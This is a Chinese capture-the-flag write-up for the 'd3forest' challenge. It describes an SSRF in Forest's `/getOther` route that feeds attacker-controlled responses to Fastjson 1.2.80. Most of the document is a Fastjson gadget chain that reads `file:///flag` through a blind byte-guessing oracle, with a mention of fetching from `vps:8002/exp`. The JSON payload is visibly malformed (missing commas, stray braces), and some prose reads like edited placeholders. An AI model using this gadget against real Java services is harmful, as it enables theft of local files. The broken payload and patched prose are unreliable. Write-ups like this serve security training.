# d3forest

## 题目简述

题目入口是 Forest 框架的 `/getOther` 请求转发功能，存在 SSRF。Forest 会把远端响应按目标类型自动反序列化，默认 JSON converter 使用存在风险的 Fastjson 1.2.80。利用方向不是直接命令执行，而是构造 Fastjson gadget 读取 `file:///flag`，再通过不同响应结果做盲注确认字节。

## 解题过程

1. `/getOther` 路由存在 SSRF 漏洞，例如：

```
/getOther?route=http://host:port/
```

2. Forest 请求会把响应数据自动反序列化成目标数据类型。默认 JSON converter 使用 Fastjson，而 Fastjson 1.2.80 存在安全问题。

3. 因此需要找到一个可用 gadget，理想情况下是 RCE；这里使用的是文件读取 gadget。

```
[{
  "1ue": {
    "@type": "java.lang.Exception",
    "@type": "com.d3ctf.exceptions.ForestRespException"
  }
},
  {
    "2ue": {
      "@type": "java.lang.Class",
      "val": {
        "@type": "com.alibaba.fastjson.JSONObject",
  {
    "@type": "java.lang.String"
    "@type": "com.d3ctf.exceptions.ForestRespException",
    "response": ""
  }
}
},
  {
    "3ue": {
      "@type": "com.dtflys.forest.http.ForestResponse",
      "@type":
"com.dtflys.forest.backend.httpclient.response.HttpclientForestResponse",
      "entity": {
        "@type": "org.apache.http.entity.AbstractHttpEntity",
        "@type": "org.apache.http.entity.InputStreamEntity",
        "inStream": {
          "@type": "org.apache.commons.io.input.BOMInputStream",
          "delegate": {
            "@type": "org.apache.commons.io.input.ReaderInputStream",
            "reader": {
              "@type": "jdk.nashorn.api.scripting.URLReader",
              "url": "file:///flag"
            },
            "charsetName": "UTF-8",
            "bufferSize": 1024
          },
          "boms": [
            {
              "@type": "org.apache.commons.io.ByteOrderMark",
              "charsetName": "UTF-8",
              "bytes": [
                ${exp}
              ]
            }
          ]
        }
      }
    }
  },
  {
    "4ue": {
      "$ref": "$[2].3ue.entity.inStream"
    }
  },
  {
    "5ue": {
      "$ref": "$[3].4ue.bOM.bytes"
    }
  },
  {
    "6ue": {
      "@type":
"com.dtflys.forest.backend.httpclient.response.HttpclientForestResponse",
      "entity": {
        "@type": "org.apache.http.entity.InputStreamEntity",
        "inStream": {
          "@type": "org.apache.commons.io.input.BOMInputStream",
          "delegate": {
            "@type": "org.apache.commons.io.input.ReaderInputStream",
            "reader": {
              "@type": "org.apache.commons.io.input.CharSequenceReader",
              "charSequence": {
                "@type": "java.lang.String"
  {
    "$ref": "$[4].5ue"
  },
  "start"
  :
  0,
  "end"
  :
  0
  },
  "charsetName"
  :
  "UTF-8",
  "bufferSize"
  :
  1024
  },
  "boms"
  :
  [
    {
      "@type": "org.apache.commons.io.ByteOrderMark",
      "charsetName": "UTF-8",
      "bytes": [
        1
      ]
    }
  ]
  }
}
}
}
]
```

4. 这个 gadget 会根据 `${exp}` 内容是否正确返回不同响应，因此可以写脚本进行盲注。借助 Java `file:` 协议的特性，可以遍历目录并读取文件。

5. 因此，把 `${exp}` 替换成候选字节并不断尝试即可。外部 demo 仓库主要提供了自动化盲注脚本：它反复把候选字节值放入 `ByteOrderMark.bytes` 字段，观察 Forest/Fastjson 是否返回预期响应，并逐字节恢复目标文件。核心逻辑已经在上面的 gadget 中展示，不打开仓库也能复现利用。

使用 `file:///` 访问根目录文件进行遍历，并访问 `vps:8002/exp`。

构造的长字符串 payload 用于触发解析器/沙箱中的异常路径，正文保留关键 payload 思路即可。

### 将字节转成字符串

本地运行脚本后可以得到可用输出文件，目录中出现 `answer.txt` 等结果文件作为验证。

最后使用 `file:///flag` 获取 flag。

## 方法总结

- 核心技巧：SSRF 控制 Forest 远端响应、Fastjson 1.2.80 自动类型反序列化、`URLReader` + commons-io stream gadget 读取本地文件、响应差异盲注。
- 识别信号：Java HTTP client 框架在请求后自动把 JSON 响应转成对象，且依赖 Fastjson 时，应优先检查 `@type` gadget 和本地文件读取类链。
- 复用要点：外链 demo 只是自动化枚举器，真正要保留的是 gadget 中 `${exp}` 被放进 `ByteOrderMark.bytes`，并用响应差异判断猜测字节是否正确。
